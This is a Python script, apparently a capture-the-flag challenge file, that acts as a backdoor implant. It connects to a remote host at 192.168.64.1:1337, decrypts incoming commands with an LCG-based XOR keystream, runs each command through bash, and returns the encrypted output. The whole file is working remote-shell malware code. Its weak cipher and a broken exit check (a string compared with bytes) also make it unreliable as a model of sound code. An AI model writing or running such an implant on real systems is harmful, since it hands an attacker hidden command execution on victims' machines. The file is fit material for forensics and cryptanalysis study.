from pwn import *
from params import *
from secret import SEED
from base64 import b64decode as bd, b64encode as be
import json, subprocess

class LCG:
    def __init__(self):
        self.state = SEED
        self.a = a
        self.b = b
        self.m = m
    
    def _next(self):
        self.state = (self.a * self.state + self.b) % self.m
        return self.state
    
    def generate_key(self, l):
        return bytes([self._next() & 0xff for _ in range(l)])

    def generate_packet_uuid(self):
        return hex(self._next())

    def encrypt(self, msg):
        key = self.generate_key(len(msg))
        return xor(msg, key)

    def decrypt(self, msg):
        return self.encrypt(msg)

r = remote('192.168.64.1', 1337)

lcg = LCG()

while True:
    data = json.loads(r.recvline())
    enc_cmd = bd(data['cmd'].encode())
    init = data['init']
    
    cmd = lcg.decrypt(enc_cmd).decode()

    if init:
        lcg.generate_packet_uuid()
    else:
        init = True
    
    if cmd == b'exit':
        r.close()
        break
    try:
        out = subprocess.check_output(['bash', '-c', cmd])
        enc_out = lcg.encrypt(out)
        r.sendline(be(enc_out))
    except:
        break

    r.clean()